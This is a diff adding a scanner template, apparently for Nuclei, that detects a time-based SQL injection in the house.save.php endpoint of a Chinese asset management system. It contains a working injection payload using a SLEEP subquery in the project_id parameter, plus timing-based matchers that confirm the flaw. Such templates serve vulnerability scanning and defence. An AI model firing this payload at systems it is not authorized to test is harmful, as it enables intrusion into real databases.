@@ -1,0 +1,34 @@
+id: baiyiyun-house-save-php-sqli
+info:
+  name: 百易云资产管理运营系统 house.save.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/adminx/house.save.php?project_id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP({{t1}})))OKTO)"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "没有选择项目"
+        negative: false
+        part: body
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
